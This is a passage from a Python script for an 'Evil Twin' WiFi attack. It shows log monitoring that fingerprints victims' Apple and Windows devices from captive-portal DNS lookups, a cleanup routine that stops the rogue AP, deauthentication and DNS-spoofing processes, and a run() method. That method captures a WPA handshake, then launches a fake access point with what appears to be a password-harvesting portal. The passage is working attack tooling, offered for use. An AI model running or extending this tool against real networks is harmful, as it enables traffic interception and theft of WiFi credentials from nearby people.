                    hostapd_pos = f.tell()
            
            if Path("/tmp/dnsmasq.log").exists():
                with open("/tmp/dnsmasq.log", 'r') as f:
                    f.seek(dnsmasq_pos)
                    for line in f:
                        if "query" in line and ("captive.apple.com" in line or "msftconnecttest.com" in line):
                            ip_match = re.search(r'from ([0-9.]+)', line)
                            if ip_match:
                                ip = ip_match.group(1)
                                ret, stdout, _ = self.run_command(f"arp -n | grep '^{ip} ' | awk '{{print $3}}'")
                                mac = stdout.strip()
                                if mac:
                                    if "captive.apple.com" in line:
                                        print(f"{Colors.BLUE}[DNS]{Colors.NC} Apple device detected: {mac}")
                                    elif "msftconnecttest.com" in line:
                                        print(f"{Colors.BLUE}[DNS]{Colors.NC} Windows device detected: {mac}")
                    
                    dnsmasq_pos = f.tell()
            
            time.sleep(3)
        
        self.cleanup()
    
    def cleanup(self):
        """Clean up all processes and restore settings"""
        log_info("Cleaning up...")
        
        # Kill client check process if running
        if self.config.client_check_process:
            self.config.client_check_process.terminate()
            log_debug("Terminated client check process")
        
        # Kill processes
        processes = ['hostapd', 'dnsmasq', 'airodump-ng', 'aireplay-ng', 'dnsspoof', 'passapi.py', 'php']
        for proc in processes:
            self.run_command(f"pkill -f {proc} 2>/dev/null")
            log_debug(f"Killed {proc}")
        
        if self.config.deauth_pid:
            self.run_command(f"kill {self.config.deauth_pid} 2>/dev/null")
        if self.config.airodump_pid:
            self.run_command(f"kill {self.config.airodump_pid} 2>/dev/null")
        
        # Remove virtual AP interface (only if it's virtual)
        if self.config.ap_interface and self.config.ap_base != self.config.ap_interface:
            log_info(f"Removing virtual AP interface {self.config.ap_interface}...")
            self.run_command(f"iw dev {self.config.ap_interface} del 2>/dev/null")
        
        # Reset physical AP interface to managed mode (only if we set it to AP mode)
        if (self.config.ap_interface and self.config.ap_base == self.config.ap_interface 
            and self.config.ap_interface != self.config.mon_interface
            and not self.config.monitor_mode_already):
            log_info(f"Resetting AP interface {self.config.ap_interface} to managed mode...")
            self.run_command(f"ip link set {self.config.ap_interface} down")
            self.run_command(f"iw dev {self.config.ap_interface} set type managed 2>/dev/null")
            self.run_command(f"ip link set {self.config.ap_interface} up")
        
        # Restore iptables (ignore errors)
        if Path("/sdcard/original").exists():
            log_info("Restoring iptables from /sdcard/original")
            self.run_command("iptables-restore < /sdcard/original")
        else:
            self.run_command("iptables --flush")
            self.run_command("iptables -t nat --flush")
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write("0")
        
        # Clean up all temporary files
        self.cleanup_temp_files()
        
        log_success("Cleanup complete")

    def run(self):
        """Main execution method"""
        print("========================================")
        print("      EVIL TWIN ATTACK")
        print("========================================")
        
        if os.geteuid() != 0:
            log_error("Run as root: sudo python3 attack.py")
            sys.exit(1)
        
        if not self.check_dependencies():
            sys.exit(1)
        
        log_info("Plug in external WiFi adapter...")
        if not self.select_adapter():
            sys.exit(1)
        
        if not self.scan_networks():
            sys.exit(1)
        
        if not self.capture_handshake():
            sys.exit(1)
        
        if not self.select_interfaces():
            sys.exit(1)
        
        self.update_configs()
        
        if not self.start_evil_twin():
            sys.exit(1)
        
        self.monitor_attack()

if __name__ == "__main__":
    attack = EvilTwinAttack()
    attack.run()